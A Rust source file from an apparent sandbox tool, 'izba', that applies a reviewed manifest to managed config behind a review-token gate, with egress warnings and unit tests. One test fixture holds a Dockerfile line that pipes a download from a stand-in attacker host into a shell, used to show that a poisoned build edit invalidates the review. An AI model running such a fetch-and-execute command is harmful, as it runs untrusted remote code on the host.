//! `promote` orchestration: apply `izba.yml` -> managed truth, gated on a
//! prior `izba diff` review. Extracted from
//! `crates/izba-cli/src/commands/promote.rs` so a future Tauri app command
//! can drive the same review-token gate + daemon RPC sequencing (a GUI
//! "promote" button) without re-implementing it.
//!
//! ## Event-callback parity contract
//!
//! `run()` never prints. Every user-facing message crosses `on_event` as a
//! [`PromoteEvent`]: `PromoteEvent::Info` for what used to be a bare
//! `println!` in the CLI, `PromoteEvent::Warn` for what used to be a bare
//! `eprintln!`. `crates/izba-cli/src/commands/promote.rs` wires those
//! straight back to `println!`/`eprintln!` with the SAME strings, so the
//! CLI's stdout/stderr text, ordering, and exit behavior are byte-identical
//! to before this extraction — this module only relocates *where* the
//! strings are assembled, never *what* they say. Any new message added here
//! MUST go through `on_event` (or `emit_warn`, which also records it in
//! [`PromoteOutcome::warnings`]) rather than `println!`/`eprintln!` — see the
//! `promote_rs_never_prints_directly` test below, which greps this file for
//! stray print macros.
//!
//! One inversion from a literal cut-and-paste: `izba-core` cannot depend on
//! `izba-cli` (wrong dependency direction — `app/src-tauri` links
//! `izba-core` directly and must not pull in the CLI binary crate), but
//! resolving a `spec.build:` image digest means driving a whole throwaway
//! builder sandbox (daemon Create/Start/exec/ingest/tag/teardown), which
//! lives in `izba-cli::commands::build` and prints its own progress straight
//! to stdout/stderr (not through an event channel) — moving that whole
//! orchestration into core is out of scope here. So `run()` takes an extra
//! `resolve_build_image` callback that the CLI wires to
//! `commands::build::build_image`; every other part of the interface matches
//! the extraction brief verbatim.
//!
//! ## Test coverage note
//!
//! The orchestration itself (the live daemon RPC sequencing: `ReloadPolicy`,
//! `Port*`/`Volume*` deltas, the Stop/reset-scratch/Start restart dance)
//! drives a live daemon and a real sandbox, so it has no fake-daemon unit
//! test in this module — `run()` is `#[mutants::skip]`, e2e-only, and is
//! pinned by `daemon_e2e` steps [9]-[11]
//! (`crates/izba-cli/tests/daemon_e2e.rs`, `manifest_diff_promote_live_path`).
//! Do not weaken those steps when touching this file; the decision logic it
//! composes (`gate`, `apply::plan`, `diff_normalized`, `classify`) is
//! unit-tested in its own module (`diff.rs`, `apply.rs`) and here.

use std::path::Path;

use anyhow::{bail, Result};

use crate::daemon::proto::{DaemonRequest, DaemonResponse};
use crate::daemon::DaemonClient;
use crate::manifest::diff::{DriftState, FieldDelta};
use crate::manifest::normalize::ImageSource;
use crate::manifest::schema::BuildSpec;
use crate::manifest::{apply, diff_normalized, ops, store, Normalized};
use crate::paths::Paths;
use crate::state::{load_json, RunState, STATE_FILE};

/// Outcome of the review gate: did the human's review token match?
#[derive(Debug, PartialEq, Eq)]
pub enum GateOutcome {
    /// Token matches — proceed.
    Ok,
    /// No review token on disk — `izba diff` was never run.
    NeverReviewed,
    /// Token on disk is stale — `izba.yml` changed since `izba diff`.
    Stale,
    /// No review but `--force` was passed.
    ForcedUnreviewed,
    /// Token is stale but `--force` was passed.
    ForcedStale,
}

/// Check the review gate: does the stored review token match the current
/// manifest token? Returns the outcome; the caller decides how to act.
pub fn gate(review: Option<&str>, current_token: &str, force: bool) -> GateOutcome {
    match (review, force) {
        (Some(t), _) if t == current_token => GateOutcome::Ok,
        (None, false) => GateOutcome::NeverReviewed,
        (None, true) => GateOutcome::ForcedUnreviewed,
        (Some(_), false) => GateOutcome::Stale,
        (Some(_), true) => GateOutcome::ForcedStale,
    }
}

/// Promote flags, mirroring the CLI's `--force`/`--restart`/`--reset-scratch`.
#[derive(Debug, Clone, Copy, Default)]
pub struct PromoteOpts {
    pub force: bool,
    pub restart: bool,
    pub reset_scratch: bool,
}

/// A user-facing message emitted during promote orchestration. `Info` mirrors
/// a CLI `println!` (stdout); `Warn` mirrors a CLI `eprintln!` (stderr) and is
/// also collected into [`PromoteOutcome::warnings`].
#[derive(Debug)]
pub enum PromoteEvent {
    Info(String),
    Warn(String),
}

/// What a `promote::run` call actually did, for a caller (CLI or future GUI)
/// that wants structured results rather than re-parsing event strings.
#[derive(Debug)]
pub struct PromoteOutcome {
    /// 3-way drift state (base/repo/managed), computed BEFORE this run's
    /// writes — i.e. the same classification `izba diff` would have shown
    /// going in.
    pub state: DriftState,
    /// Deltas actually applied this run (managed-before -> repo/target).
    pub applied: Vec<FieldDelta>,
    /// Restart/image-class deltas remain pending (not applied this run).
    pub needs_restart: bool,
    /// `opts.restart` executed a restart (Stop/reset-scratch/Start).
    pub restarted: bool,
    /// Sandbox was not running when promote started; live RPCs were skipped
    /// and the durable config applies on the next start.
    pub stopped: bool,
    /// Every `Warn` message, in emit order (same strings as the `Warn`
    /// events sent to `on_event`).
    pub warnings: Vec<String>,
}

/// Record `msg` as a `PromoteEvent::Warn`: push it into `warnings` and emit it
/// via `on_event`. The single choke point every warning flows through, so
/// `PromoteOutcome::warnings` and the CLI's stderr always agree.
fn emit_warn(warnings: &mut Vec<String>, on_event: &mut dyn FnMut(PromoteEvent), msg: String) {
    on_event(PromoteEvent::Warn(msg.clone()));
    warnings.push(msg);
}

/// Map a daemon reply that should be `Ok` into `Result<()>`, routing any
/// mid-request progress messages through `on_event`/`warnings` (the CLI
/// previously routed these straight to `eprintln!`).
#[mutants::skip] // reason: thin wrapper over a live daemon RPC (DaemonClient::request); e2e-only.
fn send_ok(
    client: &mut DaemonClient,
    req: &DaemonRequest,
    warnings: &mut Vec<String>,
    on_event: &mut dyn FnMut(PromoteEvent),
) -> Result<()> {
    match client.request(req, &mut |m| emit_warn(warnings, on_event, m.to_string()))? {
        DaemonResponse::Ok => Ok(()),
        DaemonResponse::Error { message } => bail!(message),
        other => bail!("unexpected daemon reply: {other:?}"),
    }
}

/// Apply `izba.yml` -> managed truth for the sandbox named `name`, whose
/// workspace is `dir` (the repo dir containing `izba.yml`). `dir` = repo
/// workspace (contains `izba.yml`); `name` = the RESOLVED sandbox name (the
/// caller has already run its own `sandbox_ref`/`--name` resolution and
/// `validate_name`). `resolve_build_image` builds a `spec.build:` image and
/// returns its digest — the CLI wires this to `commands::build::build_image`;
/// a `spec.image:` ref is resolved in-line via `image::ensure_image`.
#[mutants::skip] // reason: drives a live daemon (ReloadPolicy/Port*/Volume*/Stop/Start/Inspect over the socket) + image build/pull; e2e-only (daemon_e2e manifest_diff_promote_live_path). The decision logic it composes (gate, apply::plan, diff_normalized, classify) is unit-tested separately.
pub fn run(
    paths: &Paths,
    dir: &Path,
    name: &str,
    opts: PromoteOpts,
    on_event: &mut dyn FnMut(PromoteEvent),
    resolve_build_image: &mut dyn FnMut(&Path, &BuildSpec) -> Result<String>,
) -> Result<PromoteOutcome> {
    let PromoteOpts {
        force,
        restart,
        reset_scratch,
    } = opts;

    let (m, raw, dockerfile) = ops::load_repo_manifest(dir)?;
    let repo = Normalized::from_manifest(&m, name)?;
    let dir_managed = paths.sandbox_dir(name);

    let mut warnings: Vec<String> = Vec::new();

    // Review gate: the token binds the human review to the exact manifest+Dockerfile bytes.
    let token = store::review_token(&raw, dockerfile.as_deref());
    match gate(store::read_review(&dir_managed)?.as_deref(), &token, force) {
        GateOutcome::Ok => {}
        GateOutcome::NeverReviewed => {
            bail!("no reviewed diff — run `izba diff` first (or --force)")
        }
        GateOutcome::Stale => {
            bail!("izba.yml changed since `izba diff` — re-run it (or --force)")
        }
        GateOutcome::ForcedUnreviewed => {
            emit_warn(
                &mut warnings,
                on_event,
                "WARNING: --force: promoting changes that were never reviewed".to_string(),
            );
        }
        GateOutcome::ForcedStale => {
            emit_warn(
                &mut warnings,
                on_event,
                "WARNING: --force: izba.yml changed since review — promoting UNREVIEWED changes"
                    .to_string(),
            );
        }
    }

    let managed = ops::managed_normalized(paths, name)?;

    // 3-way drift state going into this run (mirrors `ops::compute_diff`),
    // captured BEFORE any writes below so it reflects what `izba diff` would
    // have reported at entry.
    let base = store::read_base(&dir_managed)?
        .map(|bm| Normalized::from_manifest(&bm, name))
        .transpose()?
        .unwrap_or_else(|| managed.clone());
    let state = crate::manifest::classify(&base, &repo, &managed);

    let p = apply::plan(&managed, &repo);

    // Fix 2: Refuse an image-change promote without --restart. A new image
    // requires the rw scratch overlay to be reset on the new base; writing the
    // new digest to config.json without restarting leaves the guest in a state
    // where `izba start` boots the new image over an overlay built for the old
    // one — which can be UNBOOTABLE due to missing libs / wrong ABI.
    if p.image_changed && !restart {
        bail!(
            "image change requires --restart (the rw scratch overlay must be reset \
             on the new base; pass --restart, optionally with --reset-scratch=false \
             to keep the old overlay at your own risk)"
        );
    }

    // Fix 4: Warn about egress weakening BEFORE applying, even under --force,
    // so the user always sees the security implications of their change.
    let applied: Vec<FieldDelta> = diff_normalized(&managed, &repo);
    {
        let weakening: Vec<_> = applied.iter().filter(|d| d.weakens_egress).collect();
        if !weakening.is_empty() {
            let fields: Vec<_> = weakening.iter().map(|d| d.field.as_str()).collect();
            emit_warn(
                &mut warnings,
                on_event,
                format!("WARNING: weakens egress: {}", fields.join(", ")),
            );
        }
    }

    // Resolve the image digest for the target (host-side; no proto bump).
    let digest = match &repo.image {
        ImageSource::Ref(r) => crate::image::ensure_image(paths, r)?,
        ImageSource::Build(b) => resolve_build_image(dir, b)?,
    };

    // Expert-only warning: keeping the old rw overlay on a new base can render
    // the guest UNBOOTABLE due to missing libs or ABI mismatches.
    if p.image_changed && !reset_scratch {
        emit_warn(
            &mut warnings,
            on_event,
            "WARNING: --reset-scratch=false keeps the rw overlay built on the PREVIOUS image. \
             Packages installed (e.g. apt-get) against the old base may have missing libs / \
             wrong ABI on the new image and can render the guest UNBOOTABLE. Proceed only if \
             you understand overlay semantics."
                .to_string(),
        );
    }

    let mut client = DaemonClient::connect(paths)?;

    // Fix 5: Skip live daemon RPCs when the sandbox is not running — the
    // managed config committed below takes effect on the next `izba start`.
    // Stop/Start (the restart branch below) is a lifecycle operation, not a
    // "live RPC", so it is still driven by the --restart flag regardless.
    let is_running = match client.request(
        &DaemonRequest::Inspect {
            name: name.to_string(),
        },
        &mut |_| {},
    ) {
        Ok(DaemonResponse::Inspect(det)) => det.status != "stopped",
        _ => false,
    };
    let stopped = !is_running;

    if is_running {
        // Atomicity: enact the live daemon effects FIRST, and only commit the
        // durable config.json AFTER they succeed. If a live RPC fails partway,
        // config.json stays at the OLD state so a retry recomputes the correct
        // deltas (rather than computing an empty diff against a half-applied truth).

        // policy.yaml is the one durable file that must land BEFORE its live RPC:
        // `ReloadPolicy` re-reads policy.yaml from disk. Writing it first is safe to
        // retry (idempotent) and `write_managed` rewrites it identically below.
        if p.policy_changed {
            apply::write_policy(&dir_managed, &repo.egress)?;
            send_ok(
                &mut client,
                &DaemonRequest::ReloadPolicy {
                    name: name.to_string(),
                },
                &mut warnings,
                on_event,
            )?;
        }
        for r in &p.ports_removed {
            send_ok(
                &mut client,
                &DaemonRequest::PortUnpublish {
                    name: name.to_string(),
                    bind: r.bind,
                    host_port: r.host_port,
                },
                &mut warnings,
                on_event,
            )?;
        }
        for r in &p.ports_added {
            send_ok(
                &mut client,
                &DaemonRequest::PortPublish {
                    name: name.to_string(),
                    rule: r.clone(),
                    persist: true,
                },
                &mut warnings,
                on_event,
            )?;
        }
        for gp in &p.volumes_removed {
            send_ok(
                &mut client,
                &DaemonRequest::VolumeDetach {
                    name: name.to_string(),
                    guest_path: gp.clone(),
                },
                &mut warnings,
                on_event,
            )?;
        }
        for v in &p.volumes_added {
            send_ok(
                &mut client,
                &DaemonRequest::VolumeAttach {
                    name: name.to_string(),
                    spec: v.clone(),
                },
                &mut warnings,
                on_event,
            )?;
        }
    } else {
        // Live RPCs are skipped when the sandbox is not running. Only warn
        // "changes apply on next start" when --restart won't Start it anyway.
        let will_start = restart && !p.restart_fields.is_empty();
        if !will_start {
            emit_warn(
                &mut warnings,
                on_event,
                "sandbox not running — changes apply on next start".to_string(),
            );
        }
    }

    // Commit the durable managed truth (config.json + policy.yaml)
    // unconditionally — whether the sandbox is running or not.
    // `Stop`→`Start` below reads config.json from disk, so this must precede
    // the restart branch.
    apply::write_managed(paths, name, &repo, &digest)?;

    // Restart-class fields (cpus, memory, image): apply now or note for later.
    let mut restarted = false;
    if !p.restart_fields.is_empty() {
        if restart {
            // Fix 3a: Read the confinement mode BEFORE Stop — stop clears
            // state.json, so we must capture allow_unconfined before the VMM
            // is torn down. Default to false (confined, safe) when the file is
            // absent or unreadable (sandbox already stopped).
            let run_state: Option<RunState> = load_json(&paths.sandbox_dir(name).join(STATE_FILE))
                .ok()
                .flatten();
            let allow_unconfined = run_state
                .and_then(|s| s.confinement)
                .map(|c| !c.is_confined())
                .unwrap_or(false);

            // Only Stop when the sandbox is actually running; sending Stop to a
            // non-running sandbox may error from the daemon and is unnecessary.
            if is_running {
                send_ok(
                    &mut client,
                    &DaemonRequest::Stop {
                        name: name.to_string(),
                    },
                    &mut warnings,
                    on_event,
                )?;
            }
            // Reset the rw scratch overlay to a blank state on the new base
            // before starting, so the image change boots cleanly.
            if p.image_changed && reset_scratch {
                crate::sandbox::reset_rw_scratch(paths, name)?;
            }
            // Fix 3b: Surface a helpful retry hint if Start fails after Stop —
            // the config was already committed so a plain `izba start` is safe.
            if let Err(err) = send_ok(
                &mut client,
                &DaemonRequest::Start {
                    name: name.to_string(),
                    allow_unconfined,
                },
                &mut warnings,
                on_event,
            ) {
                bail!(
                    "failed to start sandbox after promote (config already committed); \
                     run `izba start {name}` to retry: {err}"
                );
            }
            restarted = true;
            on_event(PromoteEvent::Info(format!(
                "restarted to apply: {}",
                p.restart_fields.join(", ")
            )));
        } else {
            on_event(PromoteEvent::Info(format!(
                "pending restart to apply: {} (run `izba promote --restart` or restart manually)",
                p.restart_fields.join(", ")
            )));
        }
    }

    // Advance the base + clear the consumed review token.
    store::write_base(&dir_managed, &m)?;
    store::clear_review(&dir_managed)?;
    on_event(PromoteEvent::Info(format!("promoted {name}")));

    Ok(PromoteOutcome {
        state,
        applied,
        needs_restart: !p.restart_fields.is_empty() && !restarted,
        restarted,
        stopped,
        warnings,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::manifest::store;

    #[test]
    fn gate_requires_a_token() {
        assert_eq!(gate(None, "tok", false), GateOutcome::NeverReviewed);
        assert_eq!(gate(None, "tok", true), GateOutcome::ForcedUnreviewed);
    }

    #[test]
    fn gate_detects_stale_review() {
        assert_eq!(gate(Some("old"), "new", false), GateOutcome::Stale);
        assert_eq!(gate(Some("old"), "new", true), GateOutcome::ForcedStale);
    }

    #[test]
    fn gate_passes_on_match() {
        assert_eq!(gate(Some("tok"), "tok", false), GateOutcome::Ok);
        assert_eq!(gate(Some("tok"), "tok", true), GateOutcome::Ok);
    }

    /// Graduation (dogfood 2026-07-09, spec §7/§9): the review token binds the
    /// review to BOTH files. Editing the Dockerfile after `izba diff` — with the
    /// manifest untouched — must stale the gate (the TOCTOU the swarm never
    /// reached: a poisoned build slipping under a stale review).
    #[test]
    fn dockerfile_change_invalidates_review_token() {
        let manifest = "apiVersion: izba.dev/v1alpha1\nkind: Sandbox\nspec:\n  image: x\n";
        let reviewed = store::review_token(manifest, Some("FROM alpine:3.20\n"));
        let current = store::review_token(
            manifest,
            Some("FROM alpine:3.20\nRUN curl evil.example | sh\n"),
        );
        assert_ne!(reviewed, current, "Dockerfile bytes must move the token");
        assert_eq!(gate(Some(&reviewed), &current, false), GateOutcome::Stale);
        assert_eq!(
            gate(Some(&reviewed), &current, true),
            GateOutcome::ForcedStale
        );
    }

    /// Graduation: editing izba.yml after `izba diff` equally stales the gate
    /// (complements gate_detects_stale_review with the real token function).
    #[test]
    fn manifest_edit_after_diff_invalidates_review_token() {
        let reviewed = store::review_token("spec: a", None);
        let current = store::review_token("spec: a  # edited after review", None);
        assert_ne!(reviewed, current);
        assert_eq!(gate(Some(&reviewed), &current, false), GateOutcome::Stale);
    }

    /// `PromoteOpts::default()` must be the all-false, safest-by-default
    /// posture (no forced gate bypass, no implicit restart, no scratch wipe) —
    /// a caller that forgets to set a field never silently escalates.
    #[test]
    fn promote_opts_default_is_all_false() {
        let opts = PromoteOpts::default();
        assert!(!opts.force);
        assert!(!opts.restart);
        assert!(!opts.reset_scratch);
    }

    /// Byte-parity contract enforcement: this module must never print
    /// directly — every user-facing string flows through `on_event`/
    /// `emit_warn` so the CLI (and, later, a GUI) fully controls rendering.
    /// Only scans the production code (everything before `mod tests`): the
    /// test module legitimately mentions `println!`/`eprintln!` inside
    /// string literals while describing/exercising this very check.
    #[test]
    fn promote_rs_never_prints_directly() {
        let src = include_str!("promote.rs");
        let production = src.split("\n#[cfg(test)]\n").next().unwrap_or(src);
        for line in production.lines() {
            let trimmed = line.trim_start();
            if trimmed.starts_with("//") {
                continue;
            }
            assert!(
                !trimmed.contains("println!") && !trimmed.contains("eprintln!"),
                "promote.rs must not print directly, found: {line:?}"
            );
        }
    }
}
